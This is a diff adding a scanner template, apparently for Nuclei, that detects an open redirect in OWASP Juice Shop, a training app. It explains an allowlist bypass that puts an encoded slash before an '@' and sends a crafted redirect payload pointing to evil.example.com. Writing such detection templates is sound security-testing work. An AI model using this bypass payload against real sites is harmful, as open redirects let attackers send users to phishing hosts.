@@ -1,0 +1,34 @@
+id: juiceshop-open-redirect
+
+info:
+  name: OWASP Juice Shop - Open Redirect via Allowlist Bypass
+  author: security-tester
+  severity: medium
+  description: >
+    The /redirect endpoint validates the 'to' parameter against an allowlist
+    of trusted URL prefixes, but the check is a naive startswith/substring
+    match. Encoding a path separator (%2f) before an '@' lets an attacker
+    smuggle an allowlisted URL as HTTP userinfo, so the browser navigates to
+    an attacker-controlled host that follows the '@' while the allowlist
+    check still matches the beginning of the string.
+  tags: juiceshop, redirect, misconfig
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/redirect?to=https://github.com/juice-shop/juice-shop%2f@evil.example.com"
+
+    headers:
+      Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+
+      - type: word
+        part: header
+        words:
+          - "evil.example.com"
+# digest: 490a00463044022001786985dfa03f103b324f794f2e50cbedcd0c14549168db5bcf9fde2e186bbc02207cfaad3ca1652a5d1cda2acf816d2402de4a242d62afa23f3f9ffc29fbcfaeb2:2ded6eed97d125cafacc29c18bc0d60c
